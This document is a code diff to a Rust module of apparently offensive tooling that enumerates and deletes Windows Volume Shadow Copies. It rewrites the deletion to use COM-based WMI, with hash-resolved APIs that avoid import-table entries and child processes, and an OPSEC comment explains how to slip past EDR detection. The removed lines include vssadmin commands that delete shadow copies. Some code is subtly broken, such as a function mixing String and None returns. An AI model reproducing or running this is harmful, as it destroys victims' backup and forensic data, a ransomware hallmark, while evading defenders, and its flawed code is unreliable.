@@ -17,26 +17,300 @@
 //   - NTFS metadata ($MFT, $LogFile) from before modification
 //
 // Deletion methods:
-//   1. WMI: Win32_ShadowCopy.Delete_() — preferred, programmatic
-//   2. vssadmin: `vssadmin delete shadows /all /quiet` — fallback
-//   3. WMI selective: delete by ID or by creation time
+//   1. WMI COM: Win32_ShadowCopy enumeration + DeleteInstance — primary
+//   2. WMI COM: ExecMethod("Delete_") — alternative
 //
 // OPSEC WARNING:
 //   Deleting ALL shadow copies is a high-visibility action commonly
 //   associated with ransomware.  Many EDR products flag this behavior.
 //   Prefer selective deletion (by ID or keeping the N newest).
 //
-// All operations use NT API and COM-based WMI to avoid IAT entries.
+// All WMI operations use COM with hash-based dynamic API resolution — no
+// IAT entries are created for any DLL.  No child processes are spawned
+// (no powershell.exe, no vssadmin.exe).
 // Windows-only, gated by `forensic-cleanup` feature flag.
 
-use std::ffi::OsStr;
+use std::ffi::c_void;
 use std::mem;
-use std::os::windows::ffi::OsStrExt;
-use std::process::Command;
+use std::ptr;
 
-use anyhow::{anyhow, bail, Context, Result};
-use log::{debug, info, warn};
+use anyhow::{anyhow, bail, Result};
+use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
+
+use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
+
+// ── Compile-time API hash constants ─────────────────────────────────────────
+
+// ole32.dll — COM initialization and instance creation
+const HASH_OLE32_DLL: u32 = hash_wstr_const(&[
+    'o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16,
+    'd' as u16, 'l' as u16, 'l' as u16, 0,
+]);
+const FN_CO_INITIALIZE_EX: u32 = hash_str_const(b"CoInitializeEx");
+const FN_CO_UNINITIALIZE: u32 = hash_str_const(b"CoUninitialize");
+const FN_CO_CREATE_INSTANCE: u32 = hash_str_const(b"CoCreateInstance");
+const FN_CO_SET_PROXY_BLANKET: u32 = hash_str_const(b"CoSetProxyBlanket");
+
+// oleaut32.dll — VARIANT and BSTR operations
+const HASH_OLEAUT32_DLL: u32 = hash_wstr_const(&[
+    'o' as u16, 'l' as u16, 'e' as u16, 'a' as u16, 'u' as u16, 't' as u16,
+    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+]);
+const FN_SYS_ALLOC_STRING: u32 = hash_str_const(b"SysAllocString");
+const FN_SYS_FREE_STRING: u32 = hash_str_const(b"SysFreeString");
+const FN_VARIANT_INIT: u32 = hash_str_const(b"VariantInit");
+const FN_VARIANT_CLEAR: u32 = hash_str_const(b"VariantClear");
+
+// ── Windows type imports ────────────────────────────────────────────────────
+
+use crate::win_types::{CLSID, IID};
+use crate::win_types::DWORD;
+use windows_sys::Win32::System::Com::{RPC_C_AUTHN_LEVEL_CALL, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, RPC_C_IMP_LEVEL_IMPERSONATE};
+use windows_sys::Win32::System::Com::{CLSCTX_INPROC_SERVER, CLSCTX_LOCAL_SERVER};
+use crate::win_types::HRESULT;
+use windows_sys::Win32::System::Com::COINIT_MULTITHREADED;
+use windows_sys::Win32::System::Com::EOLE_AUTHENTICATION_CAPABILITIES;
+use windows_sys::Win32::System::Wmi::{CLSID_WbemLocator, IEnumWbemClassObject, IID_IWbemLocator, IWbemClassObject, IWbemLocator, IWbemServices, WBEM_FLAG_FORWARD_ONLY, WBEM_FLAG_RETURN_IMMEDIATELY, WBEM_INFINITE};
+use windows_sys::Win32::System::Wmi::IID_IWbemServices;
+// ── COM helper types ────────────────────────────────────────────────────────
+
+/// BSTR type alias (pointer to wide string with length prefix).
+type BSTR = *mut u16;
+
+/// VARIANT type for WMI property passing.
+#[repr(C)]
+#[derive(Copy, Clone)]
+struct VARIANT {
+    vt: u16,
+    w_reserved1: u16,
+    w_reserved2: u16,
+    w_reserved3: u16,
+    data: VARIANT_DATA,
+}
+
+#[repr(C)]
+#[derive(Copy, Clone)]
+union VARIANT_DATA {
+    bstr_val: BSTR,
+    i4_val: i32,
+    bool_val: i16,
+    ptr_val: *mut c_void,
+    uint8_val: u8,
+}
+
+const VT_BSTR: u16 = 8;
+const VT_I4: u16 = 3;
+const VT_EMPTY: u16 = 0;
+const VT_NULL: u16 = 1;
+
+/// Helper: check if an HRESULT indicates success.
+fn hr_ok(hr: HRESULT) -> bool {
+    hr >= 0
+}
+
+/// Wide-string pointer type (matches winapi's LPCWSTR).
+type LPCWSTR = *const u16;
+
+/// RAII guard that calls `CoUninitialize` on drop.
+struct CoUninitializeGuard;
+
+impl Drop for CoUninitializeGuard {
+    fn drop(&mut self) {
+        unsafe {
+            let ole32 = match pe_resolve::get_module_handle_by_hash(HASH_OLE32_DLL) {
+                Some(b) => b,
+                None => return,
+            };
+            let co_uninit = match pe_resolve::get_proc_address_by_hash(ole32, FN_CO_UNINITIALIZE) {
+                Some(a) => a,
+                None => return,
+            };
+            let co_uninit: unsafe extern "system" fn() =
+                mem::transmute(co_uninit);
+            co_uninit();
+        }
+    }
+}
+
+// ── Dynamic API resolution helpers ──────────────────────────────────────────
+
+/// Resolves an ole32.dll export by hash and transmutes to the requested type.
+unsafe fn resolve_ole32<T>(fn_hash: u32) -> Option<T> {
+    let base = pe_resolve::get_module_handle_by_hash(HASH_OLE32_DLL)?;
+    let addr = pe_resolve::get_proc_address_by_hash(base, fn_hash)?;
+    Some(mem::transmute::<usize, T>(addr))
+}
+
+/// Resolves an oleaut32.dll export by hash and transmutes to the requested type.
+unsafe fn resolve_oleaut32<T>(fn_hash: u32) -> Option<T> {
+    let base = pe_resolve::get_module_handle_by_hash(HASH_OLEAUT32_DLL)?;
+    let addr = pe_resolve::get_proc_address_by_hash(base, fn_hash)?;
+    Some(mem::transmute::<usize, T>(addr))
+}
+
+/// Allocates a BSTR from a Rust string.  Returns a null pointer on failure.
+unsafe fn alloc_bstr(s: &str) -> BSTR {
+    let sys_alloc: unsafe extern "system" fn(*const u16) -> BSTR =
+        resolve_oleaut32(FN_SYS_ALLOC_STRING).expect("SysAllocString not found");
+    let wide: Vec<u16> = s.encode_utf16().chain(std::iter::once(0u16)).collect();
+    sys_alloc(wide.as_ptr())
+}
+
+/// Frees a BSTR.  No-op if the pointer is null.
+unsafe fn free_bstr(b: BSTR) {
+    if b.is_null() {
+        return;
+    }
+    let sys_free: unsafe extern "system" fn(BSTR) =
+        resolve_oleaut32(FN_SYS_FREE_STRING).expect("SysFreeString not found");
+    sys_free(b);
+}
+
+/// Initializes a VARIANT to VT_EMPTY.
+unsafe fn variant_init(v: *mut VARIANT) {
+    let vi: unsafe extern "system" fn(*mut VARIANT) =
+        resolve_oleaut32(FN_VARIANT_INIT).expect("VariantInit not found");
+    vi(v);
+}
+
+/// Clears a VARIANT (releases contents).
+unsafe fn variant_clear(v: *mut VARIANT) {
+    let vc: unsafe extern "system" fn(*mut VARIANT) -> HRESULT =
+        resolve_oleaut32(FN_VARIANT_CLEAR).expect("VariantClear not found");
+    vc(v);
+}
+
+// ── WMI connection ──────────────────────────────────────────────────────────
+
+/// Connects to the WMI `ROOT\cimv2` namespace (where `Win32_ShadowCopy` lives).
+///
+/// Performs the full COM initialization sequence via hash-based resolution:
+/// 1. `CoInitializeEx(NULL, COINIT_MULTITHREADED)`
+/// 2. `CoCreateInstance(CLSID_WbemLocator, …, IID_IWbemLocator)`
+/// 3. `locator.ConnectServer("ROOT\\cimv2", …)`
+/// 4. `CoSetProxyBlanket(services, …)`
+///
+/// Returns `(guard, services)` on success.  The guard calls `CoUninitialize`
+/// on drop.
+unsafe fn wmi_connect_cimv2() -> Result<(CoUninitializeGuard, *mut IWbemServices)> {
+    // Step 1 — CoInitializeEx
+    let co_init: unsafe extern "system" fn(*mut c_void, DWORD) -> HRESULT =
+        resolve_ole32(FN_CO_INITIALIZE_EX)
+            .ok_or_else(|| anyhow!("cannot resolve CoInitializeEx"))?;
+    let hr = co_init(ptr::null_mut(), COINIT_MULTITHREADED);
+    // S_FALSE (0x00000001) means already initialized on this thread — that is OK.
+    if hr < 0 && hr != 0x00000001_i32 as HRESULT {
+        bail!("CoInitializeEx failed: {hr:#010x}");
+    }
+    let guard = CoUninitializeGuard;
+
+    // Step 2 — CoCreateInstance(CLSID_WbemLocator)
+    let co_create: unsafe extern "system" fn(
+        *const CLSID,
+        *mut c_void,
+        DWORD,
+        *const IID,
+        *mut *mut c_void,
+    ) -> HRESULT = resolve_ole32(FN_CO_CREATE_INSTANCE)
+        .ok_or_else(|| anyhow!("cannot resolve CoCreateInstance"))?;
+
+    let mut locator: *mut IWbemLocator = ptr::null_mut();
+    let hr = co_create(
+        &CLSID_WbemLocator,
+        ptr::null_mut(),
+        CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER,
+        &IID_IWbemLocator,
+        &mut locator as *mut *mut IWbemLocator as *mut *mut c_void,
+    );
+    if !hr_ok(hr) {
+        bail!("CoCreateInstance(CLSID_WbemLocator) failed: {hr:#010x}");
+    }
+
+    // Step 3 — locator.ConnectServer("ROOT\\cimv2", ...)
+    let namespace_bstr = alloc_bstr("ROOT\\cimv2");
+    let mut services: *mut IWbemServices = ptr::null_mut();
+    let hr = (*(*locator).lpVtbl).ConnectServer(
+        locator,
+        namespace_bstr,
+        ptr::null_mut(), // strUser
+        ptr::null_mut(), // strPassword
+        ptr::null_mut(), // strLocale
+        0,               // lSecurityFlags
+        ptr::null_mut(), // strAuthority
+        ptr::null_mut(), // pCtx
+        &mut services,
+    );
+    free_bstr(namespace_bstr);
+
+    // Release the locator — we no longer need it.
+    (*(*locator).lpVtbl).Release(locator);
+
+    if !hr_ok(hr) {
+        bail!("ConnectServer(ROOT\\cimv2) failed: {hr:#010x}");
+    }
+
+    // Step 4 — CoSetProxyBlanket
+    let co_blanket: unsafe extern "system" fn(
+        *mut c_void,
+        DWORD, DWORD, *mut c_void, DWORD, DWORD, *mut c_void, DWORD,
+    ) -> HRESULT = resolve_ole32(FN_CO_SET_PROXY_BLANKET)
+        .ok_or_else(|| anyhow!("cannot resolve CoSetProxyBlanket"))?;
+
+    let hr = co_blanket(
+        services as *mut c_void,
+        RPC_C_AUTHN_WINNT,            // dwAuthnSvc
+        RPC_C_AUTHZ_NONE,             // dwAuthzSvc
+        ptr::null_mut(),              // pServerPrincName
+        RPC_C_AUTHN_LEVEL_CALL,       // dwAuthnLevel
+        RPC_C_IMP_LEVEL_IMPERSONATE,  // dwImpersonationLevel
+        ptr::null_mut(),              // pAuthInfo
+        EOAC_NONE as DWORD,           // dwCapabilities
+    );
+    if !hr_ok(hr) {
+        (*(*services).lpVtbl).Release(services);
+        bail!("CoSetProxyBlanket failed: {hr:#010x}");
+    }
+
+    Ok((guard, services))
+}
+
+/// Reads a BSTR property from a WMI object and converts it to a `String`.
+/// Returns `None` if the property is null, empty, or not a BSTR.
+unsafe fn get_bstr_property(obj: *mut IWbemClassObject, prop_name: &str) -> Option<String> {
+    let name_bstr = alloc_bstr(prop_name);
+    let mut val: VARIANT = mem::zeroed();
+    variant_init(&mut val);
+    (*(*obj).lpVtbl).Get(
+        obj,
+        name_bstr,
+        0,
+        &mut val,
+        ptr::null_mut(),
+        ptr::null_mut(),
+    );
+    free_bstr(name_bstr);
+
+    let result = if val.vt == VT_BSTR && !val.data.bstr_val.is_null() {
+        let bstr = val.data.bstr_val;
+        let len = (0..).take_while(|&i| *bstr.add(i) != 0).count();
+        let slice = std::slice::from_raw_parts(bstr, len);
+        String::from_utf16_lossy(slice)
+    } else {
+        None
+    };
+
+    variant_clear(&mut val);
+    result
+}
+
+/// Reads a u64 property from a WMI object (stored as VT_BSTR string).
+/// Returns 0 if the property is missing or cannot be parsed.
+unsafe fn get_u64_property(obj: *mut IWbemClassObject, prop_name: &str) -> u64 {
+    get_bstr_property(obj, prop_name)
+        .and_then(|s| s.parse::<u64>().ok())
+        .unwrap_or(0)
+}
 
 // ═══════════════════════════════════════════════════════════════════════════
 // Data Types
@@ -82,101 +356,98 @@ pub struct DeletionResult {
 
 /// Enumerate all Volume Shadow Copies on the system.
 ///
-/// Uses WMI `Win32_ShadowCopy` class to retrieve metadata for all
-/// shadow copies.  Falls back to parsing `vssadmin list shadows` output
-/// if WMI is unavailable.
+/// Uses WMI COM to query `Win32_ShadowCopy` class directly — no child
+/// processes are spawned.  All COM and OLE32/OLEAUT32 APIs are resolved
+/// at runtime via PE export-table hashing so no IAT entries are created.
 ///
 /// # Returns
 /// Vector of shadow copy metadata, sorted by creation time (newest first).
 pub fn enumerate_shadow_copies() -> Result<Vec<ShadowCopyInfo>> {
-    // Try WMI first.
-    match enumerate_via_wmi() {
-        Ok(copies) => {
-            debug!("Enumerated {} shadow copies via WMI", copies.len());
-            return Ok(copies);
-        }
-        Err(e) => {
-            debug!("WMI enumeration failed: {}, falling back to vssadmin", e);
-        }
-    }
-
-    // Fallback to vssadmin.
-    enumerate_via_vssadmin()
+    enumerate_via_wmi()
 }
 
-/// Enumerate shadow copies via WMI (PowerShell wrapper).
+/// Enumerate shadow copies via WMI COM (IWbemServices::ExecQuery).
 ///
-/// Uses `Get-CimInstance Win32_ShadowCopy` via PowerShell to retrieve
-/// shadow copy metadata.  This avoids COM initialization complexity
-/// while still being programmatic.
+/// Connects to `ROOT\cimv2` and executes
+/// `SELECT * FROM Win32_ShadowCopy` using the COM-based WMI API.
+/// Iterates the resulting `IEnumWbemClassObject` enumerator and reads
+/// each property via `IWbemClassObject::Get`.
 fn enumerate_via_wmi() -> Result<Vec<ShadowCopyInfo>> {
-    let output = Command::new("powershell.exe")
-        .args([
-            "-NoProfile",
-            "-NonInteractive",
-            "-Command",
-            "Get-CimInstance Win32_ShadowCopy | ForEach-Object { \
-             $_.ID + '|' + $_.SetID + '|' + $_.VolumeName + '|' + \
-             $_.DeviceObject + '|' + $_.OriginatingMachine + '|' + \
-             $_.ServiceMachine + '|' + $_.InstallDate + '|' + \
-             $_.UsedBytes.ToString() }",
-        ])
-        .output()
-        .context("Failed to execute PowerShell for WMI query")?;
+    unsafe {
+        let (_guard, services) = wmi_connect_cimv2()?;
 
-    if !output.status.success() {
-        let stderr = String::from_utf8_lossy(&output.stderr);
-        bail!("PowerShell WMI query failed: {}", stderr);
-    }
+        let wql_lang = alloc_bstr("WQL");
+        let query = alloc_bstr("SELECT * FROM Win32_ShadowCopy");
 
-    let stdout = String::from_utf8_lossy(&output.stdout);
-    let mut copies = Vec::new();
+        let mut enumerator: *mut IEnumWbemClassObject = ptr::null_mut();
+        let hr = (*(*services).lpVtbl).ExecQuery(
+            services,
+            wql_lang,
+            query,
+            WBEM_FLAG_FORWARD_ONLY as i32 | WBEM_FLAG_RETURN_IMMEDIATELY as i32,
+            ptr::null_mut(),
+            &mut enumerator,
+        );
+        free_bstr(query);
+        free_bstr(wql_lang);
 
-    for line in stdout.lines() {
-        let line = line.trim();
-        if line.is_empty() {
-            continue;
+        if !hr_ok(hr) {
+            (*(*services).lpVtbl).Release(services);
+            bail!(
+                "IWbemServices::ExecQuery(SELECT * FROM Win32_ShadowCopy) failed: {hr:#010x}"
+            );
         }
 
-        let parts: Vec<&str> = line.splitn(8, '|').collect();
-        if parts.len() < 8 {
-            debug!("Skipping malformed WMI line: {}", line);
-            continue;
+        let mut copies = Vec::new();
+
+        loop {
+            let mut obj: *mut IWbemClassObject = ptr::null_mut();
+            let mut returned: u32 = 0;
+            let hr = (*(*enumerator).lpVtbl).Next(
+                enumerator,
+                WBEM_INFINITE as i32,
+                1,
+                &mut obj,
+                &mut returned,
+            );
+            if !hr_ok(hr) || returned == 0 {
+                break;
+            }
+
+            let id = get_bstr_property(obj, "ID").unwrap_or_default();
+            let set_id = get_bstr_property(obj, "SetID").unwrap_or_default();
+            let volume_name = get_bstr_property(obj, "VolumeName").unwrap_or_default();
+            let device_object = get_bstr_property(obj, "DeviceObject").unwrap_or_default();
+            let origin_machine =
+                get_bstr_property(obj, "OriginatingMachine").unwrap_or_default();
+            let service_machine =
+                get_bstr_property(obj, "ServiceMachine").unwrap_or_default();
+            let install_date = get_bstr_property(obj, "InstallDate").unwrap_or_default();
+            let used_bytes = get_u64_property(obj, "UsedBytes");
+
+            (*(*obj).lpVtbl).Release(obj);
+
+            copies.push(ShadowCopyInfo {
+                id,
+                set_id,
+                volume_name,
+                device_object,
+                origin_machine,
+                service: service_machine,
+                install_date,
+                used_bytes,
+            });
         }
 
-        let used_bytes = parts[7].parse::<u64>().unwrap_or(0);
+        (*(*enumerator).lpVtbl).Release(enumerator);
+        (*(*services).lpVtbl).Release(services);
 
-        copies.push(ShadowCopyInfo {
-            id: parts[0].to_string(),
-            set_id: parts[1].to_string(),
-            volume_name: parts[2].to_string(),
-            device_object: parts[3].to_string(),
-            origin_machine: parts[4].to_string(),
-            service: parts[5].to_string(),
-            install_date: parts[6].to_string(),
-            used_bytes,
-        });
+        // Sort by creation time, newest first.
+        copies.sort_by(|a, b| b.install_date.cmp(&a.install_date));
+
+        debug!("Enumerated {} shadow copies via WMI COM", copies.len());
+        Ok(copies)
     }
-
-    // Sort by creation time, newest first.
-    copies.sort_by(|a, b| b.install_date.cmp(&a.install_date));
-
-    Ok(copies)
-}
-
-/// Enumerate shadow copies via `vssadmin list shadows`.
-fn enumerate_via_vssadmin() -> Result<Vec<ShadowCopyInfo>> {
-    let output = Command::new("vssadmin.exe")
-        .args(["list", "shadows"])
-        .output()
-        .context("Failed to execute vssadmin")?;
-
-    if !output.status.success() {
-        bail!("vssadmin list shadows failed");
-    }
-
-    let stdout = String::from_utf8_lossy(&output.stdout);
-    parse_vssadmin_output(&stdout)
 }
 
 /// Parse vssadmin output into ShadowCopyInfo structs.
@@ -340,50 +611,38 @@ pub fn delete_shadow_copy_by_id(id: &str) -> Result<()> {
     delete_single_shadow_copy(id)
 }
 
-/// Delete a single shadow copy using WMI or vssadmin.
+/// Delete a single shadow copy using WMI COM.
+///
+/// Uses `IWbemServices::DeleteInstance` with a WMI object path constructed
+/// from the shadow copy ID.  No string interpolation into a PowerShell command
+/// — the ID is passed as a COM BSTR, eliminating the command-injection vector.
 fn delete_single_shadow_copy(id: &str) -> Result<()> {
-    // Method 1: WMI via PowerShell.
-    let ps_output = Command::new("powershell.exe")
-        .args([
-            "-NoProfile",
-            "-NonInteractive",
-            "-Command",
-            &format!(
-                "Get-CimInstance Win32_ShadowCopy | Where-Object {{ $_.ID -eq '{}' }} | Remove-CimInstance",
+    unsafe {
+        let (_guard, services) = wmi_connect_cimv2()?;
+
+        // Build the WMI object path: Win32_ShadowCopy.ID="<guid>"
+        let object_path = format!("Win32_ShadowCopy.ID=\"{}\"", id);
+        let path_bstr = alloc_bstr(&object_path);
+
+        let hr = (*(*services).lpVtbl).DeleteInstance(
+            services,
+            path_bstr,
+            0,               // lFlags
+            ptr::null_mut(), // pCtx
+            ptr::null_mut(), // ppCallResult
+        );
+        free_bstr(path_bstr);
+        (*(*services).lpVtbl).Release(services);
+
+        if hr_ok(hr) {
+            info!("Deleted shadow copy {} via WMI COM DeleteInstance", id);
+            Ok(())
+        } else {
+            bail!(
+                "WMI DeleteInstance failed for shadow copy {}: {hr:#010x}",
                 id
-            ),
-        ])
-        .output();
-
-    match ps_output {
-        Ok(output) if output.status.success() => {
-            info!("Deleted shadow copy {} via WMI", id);
-            return Ok(());
+            )
         }
-        Ok(output) => {
-            let stderr = String::from_utf8_lossy(&output.stderr);
-            debug!(
-                "WMI deletion failed for {}: {}, trying vssadmin",
-                id, stderr
-            );
-        }
-        Err(e) => {
-            debug!("PowerShell execution failed: {}, trying vssadmin", e);
-        }
-    }
-
-    // Method 2: vssadmin.
-    let vss_output = Command::new("vssadmin.exe")
-        .args(["delete", "shadows", "/shadow", id, "/quiet"])
-        .output()
-        .context("Failed to execute vssadmin delete")?;
-
-    if vss_output.status.success() {
-        info!("Deleted shadow copy {} via vssadmin", id);
-        Ok(())
-    } else {
-        let stderr = String::from_utf8_lossy(&vss_output.stderr);
-        bail!("Failed to delete shadow copy {}: {}", id, stderr)
     }
 }
 
